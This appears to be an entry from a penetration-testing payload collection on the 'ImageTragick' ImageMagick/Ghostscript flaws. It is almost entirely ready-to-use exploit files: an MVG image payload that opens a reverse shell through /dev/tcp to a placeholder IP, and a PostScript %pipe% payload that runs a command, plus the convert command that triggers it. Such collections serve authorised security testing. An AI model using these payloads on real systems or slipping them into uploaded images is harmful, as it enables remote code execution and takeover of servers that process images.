# Image Tragik 1 & 2


## Exploit v1

Simple reverse shell

```powershell
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

## Exploit v2

Simple `id` payload

```powershell
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

then use `convert shellexec.jpeg whatever.gif`

## Thanks to

* [openwall.com/lists/oss-security/2018/08/21/2 by Tavis Ormandy](http://openwall.com/lists/oss-security/2018/08/21/2)